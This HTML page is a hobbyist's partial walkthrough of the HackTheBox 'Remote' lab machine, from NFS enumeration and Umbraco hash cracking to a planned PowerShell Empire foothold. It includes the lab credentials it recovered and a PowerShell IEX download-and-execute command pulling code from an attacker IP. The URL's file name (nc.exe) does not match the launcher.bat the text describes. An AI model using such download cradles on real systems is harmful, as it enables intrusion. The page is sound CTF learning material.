<!DOCTYPE html>
<html>
	<head>
		<title>HackTheBox Remote Writeup </title>
		
		<!-- link to main stylesheet -->
		<link rel="stylesheet" type="css/main.css">
	</head>
	<body>
		<div class="container">
    		<div class="blurb">
        		<h1>HackTheBox Remote Writeup</h1>
				<p> One of my favorite past times has turned into solving boxes over on hackthebox.eu.<br/> 
					This writeup is for an easy box by the name of remote, that had quite a few good lessons involved.<br/> <br/>
					
					<img src="images/remote.png" alt="remote" class="inline"/> <br/> <br/> <br/>
					
					We start out with the usual nmap scan <br/> <br/>
					
					<img src="images/nmap.png" alt="nmap" class="inline"/> <br/>
					
					Points of interest here are that we have anonymous FTP access, a web server, and some nfs shares. <br/> <br/>
					FTP was a dead end with nothing inside. And on the website we have a dummy Umbraco install. <br/> <br/>
					
					<img src="images/web.PNG" alt="umbraco" class="inline"/> <br/> <br/> <br/>
					
					The webserver was pretty boring with not a whole lot going on. So I decided to checkout the nfs shares. <br/> <br/>
					
					<img src="images/mounts.PNG" alt="nfs" class="inline"/> <br/> <br/> <br/>
					
					We can see we have a site_backups share that is accessible. So I copied it over to kali to check it out. <br/> <br/>
					
					<img src="images/nfs-backup.PNG" alt="nfs" class="inline"/> <br/> <br/> <br/>
					
					Some research into Umbraco showed that it stores its database in a .sdf file inside the App_Data directory. <br/>
					We can pull out the admin username and hash with a simple grep command. <br/> <br/>
					
					<img src="images/hash.PNG" alt="hash" class="inline"/> <br/> <br/> <br/>
					
					This hash is easily crackable with something like JohnTheRipper. I threw it at the rockyou.txt wordlist and we get <br/> <br/>
					
					<b> admin@htb.local : baconandcheese </b> <br/> <br/>
					
					Now that we've got some creds, I did quick search to see if there's any available exploits for Umbraco, and if we have the same vulnerable version. <br/> <br/>
					
					<img src="images/umbra-exploits.PNG" alt="umbra exploits" class="inline"/> <br/> <br/> <br/>
					
					I ended up using this public exploit script from Github instead - <br/> <br/>
					
					<a href="https://github.com/noraj/Umbraco-RCE">https://github.com/noraj/Umbraco-RCE </a> <br/> <br/>
					
					Which will essentially let us run any powershell we want on the machine. This sounded like the perfect opportunity to brush up <br/>
					on our Powershell Empire skills. Our execution flow is going to look something like this - <br/> <br/>
					
					                  1 - In empire we generate a powershell launcher, and start up a listener. <br/> <br/>
					                  2 - Drop the launcher into a launcher.bat file <br/> <br/>
					                  3 - Start up a python webserver to serve the launcher.bat file <br/> <br/>
					                  4 - Run the github exploit with <b> powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/nc.exe')" </b> <br/> <br/> <br/>
					
					This should pull our launcher.bat file, make the connection to our empire agent, which feeds it the rest of a fully interactive shell. <br/>
					We should end up with a fully interactive empire agent if all goes right. <br/> <br/> <br/>
					
					Step1 <br/>
					<img src="images/emp-listener.PNG" alt="empire" class="inline"/> <br/> <br/> 
					<img src="images/empire-launcher.PNG" alt="empire" class="inline"/> <br/> <br/> <br/> <br/> 
					
					Step2 and 3
					<img src="images/launcher.PNG" alt="empire" class="inline"/>
					
																    
					
					
			
			</p>
    		</div><!-- /.blurb -->
		<div class="blurb">	
		</div><!-- /.container -->
		
	</body>
</html>
